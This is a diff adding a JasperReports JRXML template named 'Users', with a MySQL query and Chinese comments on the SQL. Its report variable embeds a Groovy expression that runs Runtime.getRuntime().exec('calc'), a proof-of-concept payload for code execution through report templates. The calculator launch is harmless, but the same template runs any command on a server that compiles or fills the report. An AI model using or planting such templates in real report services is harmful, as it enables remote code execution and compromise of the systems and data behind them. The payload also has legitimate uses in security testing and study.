@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<jasperReport xmlns="http://jasperreports.sourceforge.net/jasperreports"
+              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+              xsi:schemaLocation="http://jasperreports.sourceforge.net/jasperreports http://jasperreports.sourceforge.net/xsd/jasperreport.xsd"
+              name="Users" language="groovy" pageWidth="612" pageHeight="792"
+              columnWidth="468" leftMargin="72" rightMargin="72" topMargin="72" bottomMargin="72">
+    <queryString>
+        <!-- 需要根据不同的数据库设置不同的SQL语句，此处是MySQL -->
+        <!-- 请控制SQL语句查询结果的数量 -->
+        <![CDATA[SELECT * FROM users WHERE id =1]]>
+    </queryString>
+
+    <variable name="run" resetType="None">
+        <variableExpression > <![CDATA["<s></s>"+(java.lang.Runtime.getRuntime().exec("calc"))]]>
+        </variableExpression >
+    </variable>
+
+</jasperReport>
